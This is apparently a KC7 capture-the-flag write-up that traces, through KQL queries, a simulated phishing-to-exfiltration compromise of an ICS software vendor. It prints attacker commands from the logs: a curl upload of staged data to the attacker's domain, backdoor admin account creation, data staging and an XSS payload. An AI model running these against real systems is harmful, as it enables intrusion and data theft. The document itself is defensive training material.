# SOLVI SYSTEMS: A Tale of Supply Chains and ICS

A full-chain supply chain compromise investigation targeting Industrial Control Systems (ICS) infrastructure serving power and utility companies across Southern Africa, investigated using Azure Data Explorer (ADX) and KQL.

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-KC7-blue?style=flat-square)
![Category](https://img.shields.io/badge/Category-ICS%20%2F%20Supply%20Chain-purple?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-KQL%20%2F%20ADX-orange?style=flat-square)

---

## Challenge Overview

| Attribute | Details |
|---|---|
| **Challenge Name** | SOLVI SYSTEMS: A Tale of Supply Chains and ICS |
| **Author** | David Brown |
| **Platform** | KC7 |
| **Category** | ICS Security / Supply Chain Attack |
| **Difficulty** | Medium |
| **Investigation Tool** | Azure Data Explorer (ADX) with KQL |
| **Target Organization** | Solvi Systems |
| **Industry** | Power and utility companies — South Africa, Mozambique, Eswatini, Zimbabwe, Namibia |

**Scenario:** Solvi Systems develops DOCKS software used by power and utility companies across Southern Africa. This investigation reconstructs a sophisticated supply chain compromise — from initial phishing through malware deployment, lateral movement, and exfiltration of sensitive ICS documentation.

---

## Attack Timeline

| Date | Event |
|---|---|
| 2024-05-01 | First phishing email sent to Carla Wharton |
| 2024-05-01 15:58 | ecobug.exe deployed on JUSP-LAPTOP |
| 2024-05-02 | Discovery commands executed (netstat, net view, net share) |
| 2024-05-02 16:25 | Backdoor account gu@rd!an created |
| 2024-05-27 | Lateral movement to DOCKS personnel, data staging begins |
| 2024-05-27 17:52 | CollectedData.zip compressed |
| 2024-05-28–29 | Exfiltration via HTTP POST to eco-awareness-update[.]net |

---

## Solution Walkthrough

### Step 1 — Organizational Reconnaissance

```kql
// Enumerate employee database
Employees
| count
// Result: 500 employees

// Identify key personnel
Employees
| where role == "CTO"
// Result: Alexis Khoza (CTO)
```

### Step 2 — Web Reconnaissance and Failed Attack Attempts

Adversaries conducted 64 reconnaissance requests against solvisystems[.]com using a consistent Opera user agent, including an XSS attempt.

```kql
InboundNetworkEvents
| where user_agent contains "Opera"
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
| count
// Result: 64 records

// XSS attempt (failed — 404)
InboundNetworkEvents
| where url contains "alert"
```

**XSS Payload:** `https://www.solvisystems[.]com/feedback?message=</script><script>alert('xss')</script>`

**Adversary IPs:**

| IP | Role |
|---|---|
| 13.201[.]46[.]208 | XSS attempts, reconnaissance |
| 98.117[.]26[.]236 | C2 server |
| 105.78[.]23[.]64 | Reconnaissance |
| 56.6[.]30[.]190 | Reconnaissance |

### Step 3 — Phishing Infrastructure Discovery

```kql
PassiveDns
| where ip has_any ("98.117.26.236", "56.6.30.190", "105.78.23.64", "13.201.46.208")
| distinct domain

Email
| where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
   or sender has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
| count
// Result: 56 phishing emails
```

**Malicious Domains:** eco-awareness-update[.]net, energy-trends4u[.]net, news-on-industry[.]com

**Phishing Senders:**
- news[@]eco-awareness-updates[.]net
- energy_industry_news[@]protonmail[.]com
- electric_updates[@]gmail[.]com

**Subject line:** `[EXTERNAL] Business Opportunity: Two major energy companies merging`

### Step 4 — Initial Compromise (Carla Wharton)

```kql
Email
| where link has_any ("eco-awareness-update.net", "energy-trends4u.net", "news-on-industry.com")
| take 1

OutboundNetworkEvents
| where url contains "news-on-industry.com"
| where src_ip contains "10.10.0.164"
```

**Victim:** Carla Wharton (`cawharton`) — JUSP-LAPTOP (10.10.0.164)
**Email received:** 2024-05-01T15:51:41Z
**Link clicked:** 2024-05-01T15:57:41Z (6 minutes later)
**Malicious link:** `http://news-on-industry[.]com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx`

### Step 5 — Malware Deployment

```kql
FileCreationEvents
| where hostname == "JUSP-LAPTOP"
| where timestamp > datetime(2024-05-01T15:57:41Z)
| take 2
```

| Time | File | Process | SHA256 |
|---|---|---|---|
| 15:58:29 | Energy_Industry_Trends_2024_4_Solvi.docx | firefox.exe | eb7126f6...5dcd2 |
| 15:59:25 | ecobug.exe | explorer.exe | 1c3ef040...3252 |

**ecobug.exe path:** `C:\ProgramData\ecobug[.]exe`
**Spread:** 39 Solvi Systems computers compromised

```kql
FileCreationEvents
| where filename contains "ecobug"
| count
// Result: 39 systems
```

### Step 6 — C2 Communication

```kql
ProcessEvents
| where process_commandline contains "ecobug.exe"
// ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337

NetworkFlow
| where dest_ip contains "98.117.26.236" and src_ip contains "10.10.0.164"
| count
// Result: 24 connections from Carla's machine
```

**C2:** 98.117[.]26[.]236:1337
**Pattern:** Daily beacon at 17:38:25 UTC
**Total C2 connections:** 470 across 38 distinct source IPs

### Step 7 — Discovery Commands

```kql
ProcessEvents
| where process_commandline contains "net"
| where username contains "cawharton"
| where hostname == "JUSP-LAPTOP"
```

| Timestamp | Command | Purpose |
|---|---|---|
| 2024-05-02 15:20:49 | `netstat -an` | Network enumeration |
| 2024-05-02 15:53:49 | `net view` | Network share discovery |
| 2024-05-02 17:28:49 | `net share` | Share enumeration |
| 2024-05-02 17:54:49 | `net use` | Last discovery command |

### Step 8 — Persistence and Privilege Escalation

```kql
ProcessEvents
| where process_commandline contains "gu@rd!an"
| take 1
```

**Backdoor account created:** `gu@rd!an` / `abc1toothree`
**Created by:** makertzman on MQQY-MACHINE at 2024-05-02T16:25:20Z

```cmd
net users /add gu@rd!an abc1toothree
net localgroup administrators gu@rd!an /add
net use /PERSISTENT:YES
```

**Persistence established on:** SJ9V-MACHINE, UPLM-DESKTOP, JP4D-MACHINE

### Step 9 — Lateral Movement to ICS Personnel

**Target:** Alexei Petrov (`alpetrov`) — DOCKS Customer Success Manager — SJ9V-MACHINE (10.10.0.3)

```kql
InboundNetworkEvents
| where url contains "process"
// Accessed: https://devportal.solvisystems[.]com/development_lifecycle/internal_process.pdf
```

**Internal spearphish from compromised account:**
- Sender: alexei_petrov[@]solvisystems[.]com (compromised)
- Subject: `🤔 ¡Urgent Request: DOCKS System Documentation 🚨`
- Targets: bernadette_callahan, sibongile_sithole, michael_potts, marcia_biron, lerato_naidoo

### Step 10 — Data Staging and Exfiltration

```kql
ProcessEvents
| where hostname == "SJ9V-MACHINE"
| where process_commandline contains "copy"
```

```powershell
# Data collection
Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* `
  -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs

# Compression
Compress-Archive -Path C:\Users\alpetrov\CollectedData\* `
  -DestinationPath C:\DataExfil\CollectedData.zip

# Exfiltration
curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update[.]net/upload
```

**Exfiltration events:**

| Account | Hostname | Timestamp | File |
|---|---|---|---|
| alpetrov | SJ9V-MACHINE | 2024-05-28 11:23:14 | CollectedData.zip |
| jalee | UPLM-DESKTOP | 2024-05-29 10:22:59 | CollectedData.zip |
| tagreen | JP4D-MACHINE | 2024-05-29 16:20:39 | CollectedData.zip |

---

## IOC Table

| Type | Indicator | Context |
|---|---|---|
| IP | 98.117[.]26[.]236 | C2 server, port 1337 |
| IP | 13.201[.]46[.]208 | XSS attempts, recon |
| IP | 105.78[.]23[.]64 | Reconnaissance |
| IP | 56.6[.]30[.]190 | Reconnaissance |
| Domain | eco-awareness-update[.]net | Phishing / exfil endpoint |
| Domain | energy-trends4u[.]net | Phishing |
| Domain | news-on-industry[.]com | Malware delivery |
| File | ecobug[.]exe | Malware — C:\ProgramData\ |
| Hash | 1c3ef040...3252 | ecobug.exe SHA256 |
| Account | gu@rd!an | Backdoor account |
| Email | news[@]eco-awareness-updates[.]net | Phishing sender |

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique | Evidence |
|---|---|---|---|
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | Energy_Industry_Trends docx |
| Execution | T1059.001 | PowerShell | Data staging commands |
| Persistence | T1136.001 | Create Account: Local Account | gu@rd!an backdoor |
| Persistence | T1547.001 | Registry Run Keys / Startup | net use /PERSISTENT:YES |
| Discovery | T1049 | System Network Connections | netstat -an |
| Discovery | T1135 | Network Share Discovery | net view, net share |
| Lateral Movement | T1021 | Remote Services | Pivot to DOCKS personnel |
| Collection | T1039 | Data from Network Shared Drive | SharedDocs exfil |
| Collection | T1560.001 | Archive via Utility | Compress-Archive |
| Exfiltration | T1048 | Exfiltration Over Alt Protocol | curl HTTP POST |
| Command & Control | T1071.001 | Web Protocols | C2 on port 1337 |

---

## Tools Used

- **Azure Data Explorer (ADX)** — Primary investigation platform
- **KQL** — All queries written from scratch
- **MITRE ATT&CK for ICS** — TTP mapping framework

---

## Key Takeaways

1. **Supply chain phishing is highly effective** — 56 emails, 39 compromised systems. The lure (industry news) was contextually relevant to the targets.
2. **Dual persistence redundancy** — Scheduled task + registry run key mirrors real-world APT behavior for resilience.
3. **Internal account abuse** — Using a compromised insider account (alpetrov) for internal spearphishing dramatically lowers suspicion and bypasses email security.
4. **ICS documentation as the real target** — The adversary wasn't after workstations; they were after DOCKS software development documentation to enable future ICS attacks on Southern African utility infrastructure.
5. **KQL correlation across data sources** — Connecting Email → FileCreation → ProcessEvents → NetworkFlow is the core skill this module tests.

---

## References

- [MITRE ATT&CK for ICS](https://attack.mitre.org/matrices/ics/)
- [NIST SP 800-82 Rev. 3](https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final)
- [CISA Supply Chain Risk Management](https://www.cisa.gov/supply-chain)
- [KC7 Cyber](https://kc7cyber.com)

---

*Author: David Brown | Platform: KC7 | Date: 2026-05-07*
